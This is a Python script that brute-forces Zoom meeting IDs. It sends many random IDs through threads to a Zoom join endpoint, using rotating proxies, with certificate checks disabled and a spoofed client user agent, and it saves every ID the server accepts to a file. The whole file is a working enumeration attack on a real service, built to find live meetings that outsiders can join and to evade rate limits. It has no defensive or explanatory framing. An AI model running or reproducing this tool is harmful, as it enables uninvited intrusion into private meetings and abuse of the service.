from urllib import response
import requests
from random import randint, choice
import threading
from time import sleep
import ctypes
from urllib3.exceptions import InsecureRequestWarning
import ssl
import os

failed = 0
found = 0

global_lock = threading.Lock()

ctypes.windll.kernel32.SetConsoleTitleW(f"Threads: {str(threading.active_count())} Failed: {str(failed)} Found: {str(found)}")

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

y = int(input("Threads: "))
proxyChoose = True
while proxyChoose:
    proxyType = input("Select proxy type:\n[0] - http\n[1] - socks4\n[2] - socks5 > ")
    if proxyType == "0":
        proxyType = "http"
        proxyChoose = False
    elif proxyType == "1":
        proxyType = "socks4"
        proxyChoose = False
    elif proxyType == "2":
        proxyType = "socks5"
        proxyChoose = False

def check_id(id):
    proxy = {f'https': f'{proxyType}://{choice(proxyList)}'}
    url = "https://us05www3.zoom.us:443/conf/j"
    headers = {
        "User-Agent": "Mozilla/5.0 (ZOOM.Win 10.0 x64)", 
        "Accept": "*/*", 
        "Content-Type": "multipart/form-data; boundary=------------------------e4989a6b36dcd724"
    }
    data = f"--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"clientUserSameAsWebUser\"\r\n\r\n1\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"cv\"\r\n\r\n5.10.7.6120\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"deviceId\"\r\n\r\n{id}\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\ncoolkid69@gmail.com\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"mn\"\r\n\r\n{id}\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"needWebCheckDLP\"\r\n\r\n0\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"source\"\r\n\r\nclient\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"uname\"\r\n\r\n{id}\r\n--------------------------e4989a6b36dcd724--\r\n"
    
    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False)
    except:
        return False

    if "Meeting not existed." in response.text:
        print("You may be getting ratelimited.")
        return None

    if not "web_client_join_url" in response.text:
        print(response.text)
        return False
    else:
        print(response.text)
        return True

def stats(type):
    global found, failed
    if type == "found":
        found = found + 1
    elif type == "failed":
        failed = failed + 1

def write_to_file():
    with global_lock:
        with open("ids.txt", "a") as file:
            file.write(str(threading.get_ident()))
            file.write("\n")

def readFile(filename,method):
    with open(filename,method,encoding='utf8') as f:
        content = [line.strip('\n') for line in f]
        return content

def readProxiesFile():
    restartTry = True
    while restartTry:
        try:
            proxies = readFile("proxies.txt", 'r')
            restartTry = False
            return proxies
        except:
            print("Failed to open proxies.txt")
            restartTry = True

def mythread():
    while True:
        id = str(randint(10000000000, 99999999999))
        #id = str(99779844055)
        returned = check_id(id)
        if returned:
            print(f"[./] {id}")
            stats("found")
            ctypes.windll.kernel32.SetConsoleTitleW(f"Threads: {str(threading.active_count())} Failed: {str(failed)} Found: {str(found)}")
            with global_lock:
                with open("ids.txt", "a") as file:
                    file.write(id)
                    file.write("\n")
        else:
            stats("failed")
            ctypes.windll.kernel32.SetConsoleTitleW(f"Threads: {str(threading.active_count())} Failed: {str(failed)} Found: {str(found)}")

proxyList = readProxiesFile()

def main():
    for i in range(y):
        t = threading.Thread(target=mythread)
        t.start()
        sleep(.01)

if __name__ == "__main__":
    main()